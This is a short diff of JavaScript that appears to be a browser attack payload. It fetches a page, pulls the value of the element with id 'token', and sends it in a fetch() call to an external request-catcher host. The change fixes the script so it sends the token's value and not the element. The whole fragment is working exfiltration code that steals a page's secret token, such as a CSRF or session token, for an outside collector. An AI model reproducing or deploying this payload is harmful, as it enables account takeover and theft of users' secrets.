@@ -4,7 +4,7 @@ const resp = await req.text();
 
 const parser = new DOMParser();
 const doc = parser.parseFromString(resp, "text/html");
-const token = doc.querySelector('#token');
+const token = doc.querySelector('#token').value;
 
 fetch(`https://tyyhty.requestcatcher.com/${token}`)
 
